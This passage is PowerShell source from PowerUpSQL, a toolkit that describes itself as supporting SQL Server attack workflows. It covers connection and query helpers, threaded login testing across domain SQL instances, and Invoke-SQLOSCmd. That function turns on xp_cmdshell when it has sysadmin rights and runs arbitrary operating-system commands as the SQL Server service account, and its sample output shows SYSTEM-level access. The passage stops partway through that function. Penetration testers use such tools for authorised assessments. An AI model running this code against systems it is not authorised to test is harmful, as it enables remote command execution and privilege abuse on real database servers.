#requires -version 3
<#
    File: PowerUpSQL.ps1
    Author: Scott Sutherland (@_nullbind), NetSPI - 2016
    Version: 1.0.0.0
    Description: PowerUpSQL is a PowerShell toolkit that supports common SQL Server attack workflows.
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
#>

#########################################################################
#
#region          CORE FUNCTIONS
#
#########################################################################

# ----------------------------------
#  Get-SQLConnectionObject
# ----------------------------------
# Author: Scott Sutherland
# Reference: https://msdn.microsoft.com/en-us/library/ms188247.aspx
Function  Get-SQLConnectionObject {
<#
    .SYNOPSIS
        Creates a object for connecting to SQL Server.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .EXAMPLE
        PS C:\> Get-SQLConnectionObject -Username MySQLUser -Password MySQLPassword

        StatisticsEnabled                : False
        AccessToken                      : 
        ConnectionString                 : Server=SQLServer1;Database=Master;User ID=MySQLUser;Password=MySQLPassword;Connection Timeout=1
        ConnectionTimeout                : 1
        Database                         : Master
        DataSource                       : SQLServer1
        PacketSize                       : 8000
        ClientConnectionId               : 00000000-0000-0000-0000-000000000000
        ServerVersion                    : 
        State                            : Closed
        WorkstationId                    : SQLServer1
        Credential                       : 
        FireInfoMessageEventOnUserErrors : False
        Site                             : 
        Container                        : 
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,        
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Set default db.")]
        [string]$Database,

        [Parameter(Mandatory=$false,
        HelpMessage="Dedicated Administrator Connection (DAC).")]
        [Switch]$DAC,

        [Parameter(Mandatory=$false,
        HelpMessage="Connection timeout.")]
        [string]$TimeOut = 1
    )

    Begin
    {           
        # Setup DAC string
        if($DAC){
            $DacConn = "ADMIN:"
        }else{
            $DacConn = ""
        }

        # Set database filter
        if(-not $Database){
            $Database = "Master"
        }
    }

    Process
    {
        # Check for instance
        if ( -not $Instance){           
            $Instance = $env:COMPUTERNAME
        }

        # Create connection object
        $Connection = New-Object System.Data.SqlClient.SqlConnection
    
        # Check for username and password
        if($username -and $password){
    
            # Setup connection string with SQL Server credentials
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;User ID=$username;Password=$password;Connection Timeout=$TimeOut"

        }else{
            
            # Get connecting user
            $UserDomain = [Environment]::UserDomainName
            $Username = [Environment]::UserName
            $ConnectionectUser = "$UserDomain\$Username"

            # Status user
            Write-Debug "Attempting to authenticate to $DacConn$Instance as current Windows user ($ConnectionectUser)..."

            # Setup connection string with trusted connection
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;Connection Timeout=1"                                  
        }

        # Return the connection object             
        return $Connection                     
    }

    End
    {                
    }
}


# ----------------------------------
#  Get-SQLConnectionTest
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLConnectionTest {
<#
    .SYNOPSIS
        Tests if the current Windows account or provided SQL Server login can log into an SQL Server.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DAC
        Connect using Dedicated Admin Connection. 
    .PARAMETER TimeOut
        Connection time out. 
    .PARAMETER SuppressVerbose
        Suppress verbose errors.  Used when function is wrapped.
    .EXAMPLE
        PS C:\> Get-SQLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress"
    .EXAMPLE
        PS C:\> Get-SQLConnectionTest -Verbose -Instance "SQLSERVER1.domain.com,1433"
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTest -Verbose         
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipeline,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,       

        [Parameter(Mandatory=$false,
        HelpMessage="Connect using Dedicated Admin Connection.")]
        [Switch]$DAC,

        [Parameter(Mandatory=$false,
        HelpMessage="Connection timeout.")]
        [string]$TimeOut,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for output
        $TblResults = New-Object System.Data.DataTable
        $TblResults.Columns.Add("ComputerName") | Out-Null
        $TblResults.Columns.Add("Instance") | Out-Null
        $TblResults.Columns.Add("Status") | Out-Null
    }

    Process
    {      
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance){
            $Instance = $env:COMPUTERNAME
        }

        # Setup DAC string
        if($DAC){

            # Create connection object
            $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
        }else{
            # Create connection object
            $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
        }

        # Attempt connection
        try{
            # Open connection
            $Connection.Open()                                              

            if(-not $SuppressVerbose){
                Write-Verbose "$Instance : Connection Success."           
            }

            # Add record
            $TblResults.Rows.Add("$ComputerName","$Instance","Accessible") | Out-Null

            # Close connection
            $Connection.Close()

            # Dispose connection
            $Connection.Dispose() 
        }catch{

            # Connection failed                        
            if(-not $SuppressVerbose){
                $ErrorMessage = $_.Exception.Message
                Write-Verbose "$Instance : Connection Failed."
                Write-Verbose  " Error: $ErrorMessage"
            }

            # Add record
            $TblResults.Rows.Add("$ComputerName","$Instance","Not Accessible") | Out-Null
        }          
    }

    End
    {   
        # Return Results
        $TblResults          
    }
}


# ----------------------------------
#  Get-SQLConnectionTestThreaded
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLConnectionTestThreaded {
<#
    .SYNOPSIS
        Tests if the current Windows account or provided SQL Server login can log into an SQL Server.  This version support threading using runspaces.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DAC
        Connect using Dedicated Admin Connection. 
    .PARAMETER TimeOut
        Connection time out. 
    .PARAMETER SuppressVerbose
        Suppress verbose errors.  Used when function is wrapped.
    .PARAMETER Threads
        Number of concurrent threads.
    .EXAMPLE
        PS C:\> Get-SQLConnectionTestThreaded -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress" -Threads 15
    .EXAMPLE
        PS C:\> Get-SQLConnectionTestThreaded -Verbose -Instance "SQLSERVER1.domain.com,1433" -Threads 15
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose -Threads 15
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipeline,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,       

        [Parameter(Mandatory=$false,
        HelpMessage="Connect using Dedicated Admin Connection.")]
        [Switch]$DAC,

        [Parameter(Mandatory=$false,
        HelpMessage="Connection timeout.")]
        [string]$TimeOut,

        [Parameter(Mandatory=$false,
        HelpMessage="Number of threads.")]
        [int]$Threads = 5,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for output
        $TblResults = New-Object System.Data.DataTable
        $TblResults.Columns.Add("ComputerName") | Out-Null
        $TblResults.Columns.Add("Instance") | Out-Null
        $TblResults.Columns.Add("Status") | Out-Null

        # Setup data table for pipeline threading
        $PipelineItems = New-Object System.Data.DataTable

        # Ensure provide instance is processed
        if($Instance){
            $PipelineItems = $PipelineItems + $Instance
        }
    }

    Process
    {      
      # Create list of pipeline items
      $PipelineItems = $PipelineItems + $_         
    }

    End
    {   
	    # Define code to be multi-threaded
        $MyScriptBlock = {                        
                        
            $Instance = $_.Instance
            
            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Setup DAC string
            if($DAC){

                # Create connection object
                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }else{
                # Create connection object
                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }

            # Attempt connection
            try{
                # Open connection
                $Connection.Open()                                              

                if(-not $SuppressVerbose){
                    Write-Verbose "$Instance : Connection Success."           
                }

                # Add record
                $TblResults.Rows.Add("$ComputerName","$Instance","Accessible") | Out-Null

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose() 
            }catch{

                # Connection failed       
                                 
                if(-not $SuppressVerbose){
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose "$Instance : Connection Failed."
                    #Write-Verbose  " Error: $ErrorMessage"
                }

                # Add record
                $TblResults.Rows.Add("$ComputerName","$Instance","Not Accessible") | Out-Null
            }                      		
        }         

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue                

        return $TblResults
    }
}


# ----------------------------------
#  Get-SQLQuery
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLQuery {
<#
    .SYNOPSIS
        Executes a query on target SQL servers.This
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DAC
        Connect using Dedicated Admin Connection. 
    .PARAMETER TimeOut
        Connection time out. 
    .PARAMETER SuppressVerbose
        Suppress verbose errors.  Used when function is wrapped.
    .PARAMETER Threads
        Number of concurrent threads.
    .PARAMETER Query
        Query to be executed on the SQL Server.
    .EXAMPLE
        PS C:\> Get-SQLQuery -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress" -Query "Select @@version" -Threads 15
    .EXAMPLE
        PS C:\> Get-SQLQuery -Verbose -Instance "SQLSERVER1.domain.com,1433" -Query "Select @@version" -Threads 15
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain | Get-SQLQuery -Verbose -Query "Select @@version" -Threads 15
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,
        
        [Parameter(Mandatory=$false,        
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server query.")]
        [string]$Query,

        [Parameter(Mandatory=$false,
        HelpMessage="Connect using Dedicated Admin Connection.")]
        [Switch]$DAC,

        [Parameter(Mandatory=$false,
        HelpMessage="Connection timeout.")]
        [int]$TimeOut,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup up data tables for output
        $TblQueryResults = New-Object System.Data.DataTable
    }

    Process
    {      
        # Setup DAC string
        if($DAC){

            # Create connection object
            $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -DAC 
        }else{
            # Create connection object
            $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
        }

        # Parse SQL Server instance name
        $ConnectionString = $Connection.Connectionstring
        $Instance = $ConnectionString.split(";")[0].split("=")[1]

        # Check for query
        if($Query){

            # Attempt connection
            try{
                
                # Open connection
                $Connection.Open()

                if(-not $SuppressVerbose){
                    Write-Verbose "$Instance : Connection Success."                
                }

                # Setup SQL query
                $Command = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, $Connection)

                # Grab results
                $Results = $Command.ExecuteReader()                                             

                # Load results into data table     
                $TblQueryResults.Load($Results)                                                                                      

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose() 
            }catch{
                
                # Connection failed - for detail error use  Get-SQLConnectionTest
                if(-not $SuppressVerbose){
                    Write-Verbose "$Instance : Connection Failed."
                }
            }          

        }else{
            Write-Output "No query provided to Get-SQLQuery function."
            Break
        }
    }

    End
    {   
        # Return Results
        $TblQueryResults          
    }
}


# ----------------------------------
#  Get-SQLQueryThreaded 
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLQueryThreaded {
<#
    .SYNOPSIS
        Executes a query on target SQL servers.This version support threading using runspaces.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DAC
        Connect using Dedicated Admin Connection. 
    .PARAMETER TimeOut
        Connection time out. 
    .PARAMETER SuppressVerbose
        Suppress verbose errors.  Used when function is wrapped.
    .PARAMETER Threads
        Number of concurrent threads.
    .PARAMETER Query
        Query to be executed on the SQL Server.
    .EXAMPLE
        PS C:\> Get-SQLQueryThreaded -Verbose -Instance "SQLSERVER1.domain.com\SQLExpress" -Query "Select @@version" -Threads 15
    .EXAMPLE
        PS C:\> Get-SQLQueryThreaded -Verbose -Instance "SQLSERVER1.domain.com,1433" -Query "Select @@version" -Threads 15
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain | Get-SQLQueryThreaded -Verbose -Query "Select @@version" -Threads 15
#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipeline,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,       

        [Parameter(Mandatory=$false,
        HelpMessage="Connect using Dedicated Admin Connection.")]
        [Switch]$DAC,

        [Parameter(Mandatory=$true,
        HelpMessage="Query to be executed.")]
        [String]$Query,

        [Parameter(Mandatory=$false,
        HelpMessage="Connection timeout.")]
        [string]$TimeOut,

        [Parameter(Mandatory=$false,
        HelpMessage="Number of threads.")]
        [int]$Threads = 5,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for output
        $TblResults = New-Object System.Data.DataTable

        # Setup data table for pipeline threading
        $PipelineItems = New-Object System.Data.DataTable

        # Ensure provide instance is processed
        if($Instance){
            $PipelineItems = $PipelineItems + $Instance
        }
    }

    Process
    {      
      # Create list of pipeline items
      $PipelineItems = $PipelineItems + $_         
    }

    End
    {   
	    # Define code to be multi-threaded
        $MyScriptBlock = {                        
                        
            $Instance = $_.Instance
            
            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Setup DAC string
            if($DAC){

                # Create connection object
                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }else{
                # Create connection object
                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }

            # Attempt connection
            try{
                # Open connection
                $Connection.Open()                                              

                if(-not $SuppressVerbose){
                    Write-Verbose "$Instance : Connection Success."           
                }

                # Setup SQL query
                $Command = New-Object -TypeName System.Data.SqlClient.SqlCommand -ArgumentList ($Query, $Connection)

                # Grab results
                $Results = $Command.ExecuteReader()                                         

                # Load results into data table     
                $TblResults.Load($Results)  

                # Close connection
                $Connection.Close()

                # Dispose connection
                $Connection.Dispose() 
            }catch{

                # Connection failed       
                                 
                if(-not $SuppressVerbose){
                    $ErrorMessage = $_.Exception.Message
                    Write-Verbose "$Instance : Connection Failed."
                    #Write-Verbose  " Error: $ErrorMessage"
                }

                # Add record
                $TblResults.Rows.Add("$ComputerName","$Instance","Not Accessible") | Out-Null
            }                      		
        }         

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue                

        return $TblResults
    }
}

#endregion

#########################################################################
#
#region          COMMON FUNCTIONS
#
#########################################################################

# ----------------------------------
#  Invoke-SQLOSCmd
# ----------------------------------
# Author: Scott Sutherland
Function  Invoke-SQLOSCmd {
<#
    .SYNOPSIS
        Execute command on the operating system as the SQL Server service account using xp_cmdshell. Supports threading, raw output, and table output.
    .PARAMETER Username
        SQL Server or domain account to authenticate with.   
    .PARAMETER Password
        SQL Server or domain account password to authenticate with. 
    .PARAMETER Credential
        SQL Server credential. 
    .PARAMETER Instance
        SQL Server instance to connection to. 
    .PARAMETER DAC
        Connect using Dedicated Admin Connection. 
    .PARAMETER TimeOut
        Connection time out. 
    .PARAMETER SuppressVerbose
        Suppress verbose errors.  Used when function is wrapped.
    .PARAMETER Threads
        Number of concurrent threads.
    .PARAMETER Command
        Operating command to be executed on the SQL Server.
    .PARAMETER RawResults
        Just show the raw results without the computer or instance name.
    .EXAMPLE
        PS C:\> Invoke-SQLOSCmd -Verbose -Instance "SQLServer1" -Command "dir c:\windows\system32\drivers\etc\" -RawResults
        VERBOSE: Creating runspace pool and session states
        VERBOSE: SQLServer1 : Connection Success.
        VERBOSE: SQLServer1 : Connection Success.
        VERBOSE: SQLServer1 : You are a sysadmin.
        VERBOSE: SQLServer1 : Show Advanced Options is disabled.
        VERBOSE: SQLServer1 : Enabled Show Advanced Options.
        VERBOSE: SQLServer1 : xp_cmdshell is disabled.
        VERBOSE: SQLServer1 : Enabled xp_cmdshell.
        VERBOSE: SQLServer1 : Running command: dir c:\windows\system32\drivers\etc\
        VERBOSE: SQLServer1 : Disabling xp_cmdshell
        VERBOSE: SQLServer1 : Disabling Show Advanced Options
         Volume in drive C is OSDisk
         Volume Serial Number is C044-F8BC

        VERBOSE: Closing the runspace pool
        output
        ------
      
         Directory of c:\windows\system32\drivers\etc
      
        06/22/2016  09:09 AM    <DIR>          .
        06/22/2016  09:09 AM    <DIR>          ..
        09/22/2015  10:16 AM               851 hosts
        08/22/2013  10:35 AM             3,683 lmhosts.sam
        08/22/2013  08:25 AM               407 networks
        08/22/2013  08:25 AM             1,358 protocol
        08/22/2013  08:25 AM            17,463 services
                       5 File(s)         23,762 bytes
                       2 Dir(s)  56,438,497,280 bytes free
    .EXAMPLE
        PS C:\> Invoke-SQLOSCmd -Verbose -Instance "SQLSERVER1.domain.com,1433" -Command "whoami" 
        Invoke-SQLOSCmd -Verbose -Instance "SQLServer1" -Command "whoami" 
        VERBOSE: Creating runspace pool and session states
        VERBOSE: SQLServer1 : Connection Success.
        VERBOSE: SQLServer1 : Connection Success.
        VERBOSE: SQLServer1 : You are a sysadmin.
        VERBOSE: SQLServer1 : Show Advanced Options is disabled.
        VERBOSE: SQLServer1 : Enabled Show Advanced Options.
        VERBOSE: SQLServer1 : xp_cmdshell is disabled.
        VERBOSE: SQLServer1 : Enabled xp_cmdshell.
        VERBOSE: SQLServer1 : Running command: whoami
        VERBOSE: SQLServer1 : Disabling xp_cmdshell
        VERBOSE: SQLServer1 : Disabling Show Advanced Options
        VERBOSE: Closing the runspace pool

        ComputerName   Instance       CommandResults         
        ------------   --------       --------------         
        SQLServer1     SQLServer1     nt service\mssqlserver 
    .EXAMPLE
        PS C:\> Get-SQLInstanceDomain | Invoke-SQLOSCmd -Verbose -Command "whoami" -Threads 5
        Get-SQLInstanceLocal | Invoke-SQLOSCmd -Verbose -Command "whoami" 
        VERBOSE: Creating runspace pool and session states
        VERBOSE: SQLServer1\SQLEXPRESS : Connection Success.
        VERBOSE: SQLServer1\SQLEXPRESS : Connection Success.
        VERBOSE: SQLServer1\SQLEXPRESS : You are a sysadmin.
        VERBOSE: SQLServer1\SQLEXPRESS : Show Advanced Options is already enabled.
        VERBOSE: SQLServer1\SQLEXPRESS : xp_cmdshell is already enabled.
        VERBOSE: SQLServer1\SQLEXPRESS : Running command: whoami
        VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
        VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
        VERBOSE: SQLServer1\STANDARDDEV2014 : You are a sysadmin.
        VERBOSE: SQLServer1\STANDARDDEV2014 : Show Advanced Options is already enabled.
        VERBOSE: SQLServer1\STANDARDDEV2014 : xp_cmdshell is already enabled.
        VERBOSE: SQLServer1\STANDARDDEV2014 : Running command: whoami
        VERBOSE: SQLServer1 : Connection Success.
        VERBOSE: SQLServer1 : Connection Success.
        VERBOSE: SQLServer1 : You are a sysadmin.
        VERBOSE: SQLServer1 : Show Advanced Options is disabled.
        VERBOSE: SQLServer1 : Enabled Show Advanced Options.
        VERBOSE: SQLServer1 : xp_cmdshell is disabled.
        VERBOSE: SQLServer1 : Enabled xp_cmdshell.
        VERBOSE: SQLServer1 : Running command: whoami
        VERBOSE: SQLServer1 : Disabling xp_cmdshell
        VERBOSE: SQLServer1 : Disabling Show Advanced Options
        VERBOSE: Closing the runspace pool

        ComputerName   Instance                       CommandResults              
        ------------   --------                       --------------              
        SQLServer1     SQLServer1\SQLEXPRESS          nt service\mssql$sqlexpress 
        SQLServer1     SQLServer1\STANDARDDEV2014     nt authority\system         
        SQLServer1     SQLServer1                     nt service\mssqlserver      

#>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipeline,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,       

        [Parameter(Mandatory=$false,
        HelpMessage="Connect using Dedicated Admin Connection.")]
        [Switch]$DAC,

        [Parameter(Mandatory=$true,
        HelpMessage="OS command to be executed.")]
        [String]$Command,

        [Parameter(Mandatory=$false,
        HelpMessage="Connection timeout.")]
        [string]$TimeOut,

        [Parameter(Mandatory=$false,
        HelpMessage="Number of threads.")]
        [int]$Threads = 1,

        [Parameter(Mandatory=$false,
        HelpMessage="Suppress verbose errors.  Used when function is wrapped.")]
        [switch]$SuppressVerbose,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Just show the raw results without the computer or instance name.")]
        [switch]$RawResults
    )

    Begin
    {
        # Setup data table for output
        $TblCommands = New-Object System.Data.DataTable
        $TblResults = New-Object System.Data.DataTable
        $TblResults.Columns.Add("ComputerName") | Out-Null
        $TblResults.Columns.Add("Instance") | Out-Null
        $TblResults.Columns.Add("CommandResults") | Out-Null
        

        # Setup data table for pipeline threading
        $PipelineItems = New-Object System.Data.DataTable

        # Ensure provide instance is processed
        if($Instance){
            $PipelineItems = $PipelineItems + $Instance
        }
    }

    Process
    {      
      # Create list of pipeline items
      $PipelineItems = $PipelineItems + $_         
    }

    End
    {   
	    # Define code to be multi-threaded
        $MyScriptBlock = {                        
                        
            $Instance = $_.Instance
            
            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Default connection to local default instance
            if(-not $Instance){
                $Instance = $env:COMPUTERNAME
            }

            # Setup DAC string
            if($DAC){

                # Create connection object
                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
            }else{
                # Create connection object
                $Connection =  Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
            }

            # Attempt connection
            try{
                # Open connection
                $Connection.Open()                                              

                if(-not $SuppressVerbose){
                    Write-Verbose "$Instance : Connection Success."           
                }
               
                # Switch to track xp_cmdshell status
                $DisableShowAdvancedOptions = 0
                $DisableXpCmdshell = 0

                # Get sysadmin status
                $IsSysadmin =  Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password | Select-Object IsSysadmin -ExpandProperty IsSysadmin               
      
                # Check if xp_cmdshell is enabled
                if($IsSysadmin -eq "Yes"){
                    Write-Verbose "$Instance : You are a sysadmin." 
                    $IsXpCmdshellEnabled =  Get-SQLQuery -Instance $Instance -Query "sp_configure 'xp_cmdshell'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object config_value -ExpandProperty config_value
                    $IsShowAdvancedEnabled =  Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object config_value -ExpandProperty config_value
                }else{
                    Write-Verbose "$Instance : You are not a sysadmin. This command requires sysadmin privileges." 
                     
                     # Add record
                    $TblResults.Rows.Add("$ComputerName","$Instance","No sysadmin privileges.") | Out-Null
                    return
                }

                # Enable show advanced options if needed
                if ($IsShowAdvancedEnabled -eq 1){
                    Write-Verbose "$Instance : Show Advanced Options is already enabled."
                }else{
                    Write-Verbose "$Instance : Show Advanced Options is disabled."
                    $DisableShowAdvancedOptions = 1

                    # Try to enable Show Advanced Options
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

                    # Check if configuration change worked
                    $IsShowAdvancedEnabled2 =  Get-SQLQuery -Instance $Instance -Query "sp_configure 'Show Advanced Options'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object config_value -ExpandProperty config_value

                     if ($IsShowAdvancedEnabled2 -eq 1){
                        Write-Verbose "$Instance : Enabled Show Advanced Options."
                     }else{
                        Write-Verbose "$Instance : Enabling Show Advanced Options failed. Aborting."

                        # Add record
                        $TblResults.Rows.Add("$ComputerName","$Instance","Could not enable Show Advanced Options.") | Out-Null
                        return
                     }
                }

                # Enable xp_cmdshell if needed
                if ($IsXpCmdshellEnabled -eq 1){
                    Write-Verbose "$Instance : xp_cmdshell is already enabled."
                }else{
                    Write-Verbose "$Instance : xp_cmdshell is disabled."
                    $DisableXpCmdshell = 1

                    # Try to enable xp_cmdshell
                    Get-SQLQuery -Instance $Instance -Query "sp_configure 'xp_cmdshell',1;RECONFIGURE" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

                    # Check if configuration change worked
                    $IsXpCmdshellEnabled2 =  Get-SQLQuery -Instance $Instance -Query "sp_configure xp_cmdshell" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object config_value -ExpandProperty config_value

                     if ($IsXpCmdshellEnabled2 -eq 1){
                        Write-Verbose "$Instance : Enabled xp_cmdshell."
                     }else{
                        Write-Verbose "$Instance : Enabling xp_cmdshell failed. Aborting."                
                        
                        # Add record
                        $TblResults.Rows.Add("$ComputerName","$Instance","Could not enable xp_cmdshell.") | Out-Null

                        return
                     }
                }

                # Setup OS command
                Write-Verbose "$Instance : Running command: $Command"
                $Query = "EXEC master..xp_cmdshell '$Command' WITH RESULT SETS ((output VARCHAR(MAX)))"

                # Execute OS command
                $CmdResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object output -ExpandProperty output

                # Display results or add to final results table
                if($RawResults){
                    $CmdResults
                }else{
                    $TblResults.Rows.Add($ComputerName, $Instance, [string]$CmdResults) | Out-Null                
                }
                
